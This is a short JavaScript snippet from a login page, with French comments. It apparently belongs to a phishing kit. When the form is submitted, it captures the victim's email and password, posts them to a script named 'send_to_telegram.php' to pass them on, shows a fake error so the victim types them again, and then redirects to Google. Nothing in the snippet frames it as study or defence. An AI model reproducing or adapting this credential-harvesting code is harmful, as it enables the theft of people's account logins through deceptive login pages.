    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            fetch('send_to_telegram.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ email: email, password: password }),
            })
            .then(response => response.json())
            .then(data => {
                if (data.success && data.redirect) {
                    // Redirection vers Google apr s la deuxi me soumission
                    window.location.href = data.redirect;
                } else {
                    // Afficher le message d'erreur
                    document.getElementById('errorMessage').innerText = data.error;
                    document.getElementById('email').value = ''; // Effacer le champ email
                    document.getElementById('password').value = ''; // Effacer le champ mot de passe
                }
            })
            .catch(error => console.error('Erreur:', error));
        });
    </script>
